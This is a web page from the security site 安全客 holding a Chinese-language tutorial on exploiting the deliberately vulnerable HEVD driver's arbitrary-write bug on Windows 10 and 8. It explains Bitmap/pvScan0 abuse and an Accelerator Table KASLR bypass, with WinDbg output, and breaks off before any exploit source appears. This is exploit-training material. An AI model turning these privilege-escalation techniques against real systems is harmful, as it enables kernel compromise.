<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】HEVD内核漏洞训练——陪Windows玩儿 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="HEVD,内核漏洞,Windows漏洞"/>
    
        <meta name="description" content="前段时间在博客写了一篇关于HEVD内核漏洞利用训练的一篇文章，感觉当时做HEVD收获很大，非常推荐这个训练，这是HackSys Team做的一个Kernel Driver，里面包含了大量的常见漏洞，而且漏洞原理都非常简单，考验的就是各种各样的利用方法，推荐小伙伴们在Win10下尝试。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】HEVD内核漏洞训练——陪Windows玩儿</h2>
                <div class="article-msg">
                    <span class="time">2017-02-28 15:45:24</span>
                    
                                        <span class="read">阅读：22704次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3544"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3544" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=1353169030" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01acaeca3752f24139.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=1353169030" style="color:#848e99;">k0shl</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; white-space: normal; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255);"><img src="http://p5.qhimg.com/t01dcd2fa8371551dae.jpg" title="t01c066d0010ab9f038.jpg" alt="http://p2.qhimg.com/t01c066d0010ab9f038.jpg"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; white-space: normal; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="text-indent: 2em; color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">作者：</span></span></span><a href="http://bobao.360.cn/member/contribute?uid=1353169030" target="_blank" textvalue="k0pwn_ko" style="text-decoration: none; color: rgb(51, 51, 51); line-height: 28px;"><span style="color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">k0shl</span></span></span></a><br/></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; white-space: normal; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">预估稿费：600RMB</span></span></span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; white-space: normal; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">投稿方式：发送邮件至<a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none; color: rgb(51, 51, 51); line-height: 28px;"><span style="color: rgb(0, 112, 192);">linwei#360.cn</span></a>，或登陆<a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-decoration: none; color: rgb(0, 112, 192); line-height: 28px;">网页版</a>在线投稿</span></span></span></p><p style="text-align: left; text-indent: 2em;"><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>前言</strong></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">前段时间在博客写了一篇关于HEVD内核漏洞利用训练的一篇文章，感觉当时做HEVD收获很大，非常推荐这个训练，这是HackSys Team做的一个Kernel Driver，里面包含了大量的常见漏洞，而且漏洞原理都非常简单，考验的就是各种各样的利用方法，推荐在Win10下尝试，有各种各样经典的利用方法，比如gsharedInfo，GdiSharedHandleTable，NtAllocateVirtualMemory，替换token的shellcode等等。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">对这个训练的研究学习会对内核漏洞的原理，利用方式，</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">Windows</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">下很多常见的数据结构有一个初步的了解，从此打开</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">Ring0的大门。</span></p><p style="text-align: left; text-indent: 2em;"><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">HEVD项目地址：</span><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</a></p><p style="text-align: left; text-indent: 2em;"><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对于内核漏洞入门，我推荐的入门方式就是</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">HEVD -&gt; CVE-2014-4113 -&gt; MS15-061</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">，第一个是训练，后两个是实际环境中的漏洞。感觉在</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Ring0</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">实在是太有意思了（不断被吊打，不断爬起来）！</span></p><p style="text-align: left; text-indent: 2em;"><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">HEVD：</span><a href="http://bobao.360.cn/learning/detail/3448.html" style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">http://bobao.360.cn/learning/detail/3448.html</a></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">CVE-2014-4113</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">：</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;"><a href="http://bobao.360.cn/learning/detail/3170.html" _src="http://bobao.360.cn/learning/detail/3170.html">http://bobao.360.cn/learning/detail/3170.html</a></span></p><p style="text-align: left; text-indent: 2em;"><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在高版本中采取了越来越多的保护措施来防止漏洞利用，这让攻击变得越来越有意思，很多防护限制让很多漏洞利用变得难上加难，在这篇文章中，我将针对</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">HEVD</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">的一个任意内存读写漏洞，利用</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Cn33liz</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">的一个</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Exploit</span><span style="text-indent: 0em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">来完成攻击并分析整个过程。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这次攻击有一个主角，那就是</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">Bitmap</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">，本文主要分析在最新</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">Win10</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">版本以及</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">Win8</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">下，</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">Bitmap</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">到底有多强大的威力。</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p6.qhimg.com/t014edc74a6674ebc51.png" title="t0149683f6787894b68.png" alt="http://p7.qhimg.com/t0149683f6787894b68.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">在本文中，我将首先简单介绍一下</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Bitmap</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">，最新</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Win10</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">的</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">KASLR</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">机制，对</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Bitmap</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">造成的影响，以及如何利用</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Accelerator Table</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">来</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">bypass KASLR</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">。接下来我将和大家分享如何用</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">SetBitmap</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">和</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">GetBitmap</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">来完成攻击，以及攻击的主角，</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">_SURFOBJ</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">中的一个关键结构</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">pvScan0</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">。然后我将和大家分享</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Win10</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">中的一些疑点，可能是坑，反正至今仍有一些疑惑在里面，接下来，我将结合我的偶像</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">MJ0011</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">在</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">HITCON</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">上一个关于</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Win8</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">安全特性的演讲，移步</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Win8</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">，来看看</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Bitmap</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">的超级杀伤力，以及这些安全特性的防护机制。文末我将把我在</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Win10</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">和</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Win8</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">下实验的源码放出来，这个源码中包含对抗</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Win10</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">和</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Win8</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">的防护机制的一些过程，是基于</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">Cn33liz</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 0em;">大牛的源码改写。文中所有的测试都是基于我改写的源码完成的，相应的注释都在源码中，改动源码仓促也不够漂亮，望大家海涵。因为多次重新调试，地址有变化，可以结合文字一起研究学习。</span></p><p style="text-indent: 2em;"><strong><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">本文所用原源码项目地址：</span></strong><a href="https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI</a></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">关于这个漏洞成因，我不再进行详细的讲解，HackSys team的Github项目里有详细说明，这个任意写漏洞就是可以向指定地址写进指定值，而没有对写入地址和写入内容的合法性进行检查。测试环境是最新版Win10。</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p5.qhimg.com/t0107b7cd5ec741c2a3.png" title="t012f46412b2ac9b587.png" alt="http://p6.qhimg.com/t012f46412b2ac9b587.png"/></p><p style="text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">陪Win10玩儿--CreateBitmap和KASLR</span></strong></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">我之前的那篇HEVD的分享中，是在Windows7下面完成的，在Win7下面，我们拥有很多自由，可以向很多特殊的位置、结构写入shellcode，并且在内核态完成shellcode的执行。但是在Win10中，增加了茫茫多的限制，很多利用变得很困难，shellcode似乎变得不太可行。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">而在FuzzySecurity中也提到了data attack，在众多限制下，Bitmap给我们提供了一个极大的便捷，这种攻击手段威力很强，非常有趣。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">在Windows10中，我们需要获取Bitmap的内核地址，然后利用Bitmap这种_SURFOBJ结构的一个特殊成员变量来完成攻击，也就是我们后面要提到的pvScan0。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">在之前版本的Win10中，可以通过一个特殊的结构GdiSharedHandleTable来获得Bitmap的内核对象地址。这个GdiSharedHandleTable是PEB结构体中的一个结构。而里面存放的内容是一个GDICELL64结构。关于在老版本Win10中利用GdiSharedHandleTable如何来获得Bitmap并进行攻击我不再详述，在文章末尾，我会给出一篇非常棒的技术文章，里面详述了这种攻击方式。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">在新版本Win10中，fix了这种方法，GdiSharedHandleTable获得的地址，不再是一个有效的pkernelAddress，也就是说，即使我们通过这种方式和createbitmap的handle获得了一个地址，然而并不是真正的pkernelAddress，当然我们的主角pvScan0也不正确。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;dt&nbsp;@$PEB&nbsp;nt!_PEB&nbsp;GdiSharedHandleTable&nbsp;//
&nbsp;&nbsp;&nbsp;+0x0f8&nbsp;GdiSharedHandleTable&nbsp;:&nbsp;0x00000000`00e00000&nbsp;Void
kd&gt;&nbsp;db&nbsp;0x00000000`00e00000+0x0b69*0x18&nbsp;L8
00000000`00e111d8&nbsp;&nbsp;69&nbsp;0b&nbsp;c2&nbsp;ff&nbsp;ff&nbsp;ff&nbsp;ff&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i.......
kd&gt;&nbsp;dd&nbsp;ffffffffffc20b69
ffffffff`ffc20b69&nbsp;&nbsp;????????&nbsp;????????&nbsp;????????&nbsp;????????
kd&gt;&nbsp;dd&nbsp;ffff9f9683d01000
ffff9f96`83d01000&nbsp;&nbsp;270501ac&nbsp;00000000&nbsp;00000000&nbsp;00000000
ffff9f96`83d01010&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">可以看到，在通过GdiSharedHandleTable获得的Bitmap的内核地址是一个为开辟的内核空间和真正的Bitmap内核地址有所区别。这时候，gSharedInfo出现了，这个gSharedInfo是一个非常经典的结构，在很多kernel exploitation都出现过，它其中包含着内核结构，我们可以通过它获得内核表，然后通过计算偏移得到内核对象地址。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解决这种问题的方法就是用AcceleratorTable加速键表，我之前的内核漏洞调试笔记之二调试的CVE-2015-2546就是用的加速键表，制造一个稳定的内存空洞，连续申请释放内存，直到两次申请释放的AccleratorTable的内核句柄相同，则再申请相同大小的bitmap，这样就能获得GDI对象了，再通过这个对象的phead就是pkernelAddress。</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p3.qhimg.com/t01bb24e81c8797dccd.png" title="t0134750a777dd1e538.png" alt="http://p0.qhimg.com/t0134750a777dd1e538.png"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如何获得呢？在这个handleentry里有一个aheList，其中包含了一个phead对象，它就是指向pkerneladdress的。来看一下gSharedInfo的地址，这里我也不知道为什么，感觉可能是Win10很多win32k的结构体不透明化了，看不到tagSharedInfo的结构体，感觉像被隐藏了。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;?user32!gsharedinfo&nbsp;&nbsp;//获得gsharedinfo的地址值
Evaluate&nbsp;expression:&nbsp;140725741012608&nbsp;=&nbsp;00007ffd`43cdc680</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">获得了gSharedInfo的地址之后，我们可以通过Accelerator Table的handle，获取到gSharedInfo结构中的aheList对应的内核句柄值。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">&nbsp;</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;dd&nbsp;7ffd43cdc680&nbsp;&nbsp;//查看地址值的内容
00007ffd`43cdc680&nbsp;&nbsp;01360700&nbsp;00000000&nbsp;011e0000&nbsp;00000000
